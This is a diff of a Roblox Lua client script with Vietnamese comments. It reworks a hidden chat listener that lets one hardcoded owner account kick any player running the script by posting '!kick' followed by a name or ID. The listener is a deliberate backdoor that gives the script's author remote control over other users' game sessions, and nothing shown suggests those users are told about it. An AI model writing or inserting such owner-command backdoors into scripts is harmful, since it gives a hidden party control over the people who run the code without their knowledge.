@@ -62,36 +62,32 @@ request({
 
 
 local Players = game:GetService("Players")
-
 local LocalPlayer = Players.LocalPlayer
 
--- Chủ sở hữu script
+-- Chủ sở hữu được phép dùng lệnh
 local ownerId = 4882845089
 local ownerUsername = "konmeo22132"
 
--- Lắng nghe tin nhắn từ người khác
 Players.PlayerChatted:Connect(function(player, message)
-    -- Chỉ xử lý nếu người gửi là chủ
-    if player.UserId ~= ownerId and player.Name ~= ownerUsername then return end
+    -- Kiểm tra quyền
+    if player.UserId ~= ownerId and player.Name:lower() ~= ownerUsername:lower() then return end
 
-    -- Kiểm tra !kick
-    local lowerMsg = message:lower()
-    local cmd, target, reason = lowerMsg:match("^!(%w+)%s+(%S+)%s*(.*)$")
-    
-    if cmd == "kick" then
-        reason = reason or ""
+    -- Kiểm tra lệnh !kick
+    local match = message:match("^!kick%s+(.+)$")
+    if match then
+        -- Tách target và lý do
+        local args = string.split(match, " ")
+        local target = args[1]
+        local reason = table.concat(args, " ", 2) -- nối lại lý do nếu có
+        if reason == nil or reason == "" then reason = nil end
 
-        for _, otherPlayer in pairs(Players:GetPlayers()) do
-            -- Nếu mục tiêu là người dùng này
-            if otherPlayer == LocalPlayer then
-                if tostring(LocalPlayer.UserId) == target or LocalPlayer.Name:lower() == target:lower() then
-                    local kickMessage = "Bạn đã bị kick"
-                    if reason ~= "" then
-                        kickMessage = kickMessage .. " | Lý do: " .. reason
-                    end
-                    LocalPlayer:Kick(kickMessage)
-                end
+        -- So sánh với người chơi hiện tại
+        if tostring(LocalPlayer.UserId) == target or LocalPlayer.Name:lower() == target:lower() then
+            local kickMsg = "Bạn đã bị kick"
+            if reason then
+                kickMsg = kickMsg .. " | Lý do: " .. reason
             end
+            LocalPlayer:Kick(kickMsg)
         end
     end
 end)
